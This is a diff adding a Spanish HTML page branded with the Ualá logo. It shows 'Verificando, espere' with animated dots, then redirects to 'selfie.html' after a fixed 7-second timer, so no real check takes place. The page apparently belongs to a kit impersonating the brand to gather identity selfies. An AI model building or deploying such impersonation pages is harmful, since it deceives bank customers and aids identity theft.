@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificando...</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+      background-color: #fefefe;
+      font-family: 'Segoe UI', sans-serif;
+      color: #022a9c;
+    }
+
+    img {
+      max-width: 80%;
+      height: auto;
+      margin-bottom: 20px;
+    }
+
+    #status {
+      font-size: 20px;
+      color: #022a9c;
+    }
+  </style>
+</head>
+<body>
+  <img id="logo" src="https://images.ctfassets.net/6n252fx9hkkr/4pC2sp1c3LAFN8sbSxEAPi/4570c4aaee41ece2a44871f446c6df48/Logo_Uala_Horizontal.png" alt="Logo Ualá">
+  <div id="status">Verificando, espere<span id="dots"></span></div>
+
+  <script>
+    const dots = document.getElementById('dots');
+
+    // Animación de puntos
+    let dotCount = 0;
+    const maxDots = 3;
+    const dotInterval = setInterval(() => {
+      dotCount = (dotCount + 1) % (maxDots + 1);
+      dots.textContent = '.'.repeat(dotCount);
+    }, 500);
+
+    // Redirigir después de 7 segundos
+    setTimeout(() => {
+      clearInterval(dotInterval); // detener animación de puntos
+      window.location.href = "selfie.html";
+    }, 7000);
+  </script>
+</body>
+</html>
